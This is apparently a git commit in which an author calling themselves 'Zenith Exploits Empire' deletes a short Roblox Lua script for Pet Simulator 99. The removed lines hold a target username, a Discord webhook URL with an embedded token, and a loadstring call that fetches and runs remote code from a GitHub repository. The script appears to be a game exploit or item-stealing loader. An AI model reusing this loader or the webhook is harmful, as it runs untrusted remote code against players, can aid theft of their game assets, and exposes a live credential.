f6cb92ba15037a11c159635a74939073115945af
Zenith Exploits Empire <arshansiddiqui.msvd@gmail.com>
2025-04-18 20:06:35 +0200

    Delete ps99/freezescript.lua

--- ps99/freezescript.lua
+++
@@ -1,5 +0,0 @@
-Username = "m1234ao"
-Username2 = "m1234ao"
-Webhook = "https://canary.discord.com/api/webhooks/1362764515099410492/oxHGCE3iF_Vxo2xvONjk1IkgYTEtgMxW7-QhWgirhk3lLrzpahLjrCb0AVppkJns1Uie"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Final/refs/heads/main/RAW%20-%20Pet%20Simulator%2099"))()
